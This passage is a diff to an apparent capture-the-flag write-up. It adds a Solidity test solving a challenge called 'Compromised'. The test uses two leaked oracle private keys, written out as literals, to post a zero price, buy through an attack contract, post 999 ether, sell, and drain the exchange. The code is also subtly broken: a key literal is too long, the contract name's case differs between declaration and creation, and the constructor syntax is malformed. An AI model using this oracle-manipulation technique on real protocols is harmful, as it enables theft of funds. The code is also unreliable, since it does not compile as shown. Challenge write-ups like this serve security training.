@@ -370,3 +370,34 @@ contract SelfieAttacker is IERC3156FlashBorrower{
     }
 }
 ```
+## 7. Compromised
+
+Test file: 
+```
+function test_compromised() public checkSolved {
+        uint256 privateKey1=0x7d151bba26c523683bfc3dc7cdc5d1b8a274445757dcf4d84D15cf6cf993063744;
+        uint256 privateKey2=0x68bd020ad18d6b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address source1=vm.addr(privateKey1);
+        address source2=vm.addr(privateKey2);
+
+        AttackCompromised attackContract = new attackCompromised{value:address(this).balance}{
+            oracle,exchange,nft,recovery
+        };
+        vm.prank(source1);
+        oracle.postPrice(symbols[0],0);
+        vm.prank(source2);
+        oracle.postPrice(symbols[0],0);
+
+        attackContract.buy();
+
+        vm.prank(source1);
+        oracle.postPrice(symbols[0],999 ether);
+        vm.prank(source2);
+        oracle.postPrice(symbols[0],999 ether);
+
+        attackContract.sell();
+        attackContract.recover(999 ether);
+    }
+
+```
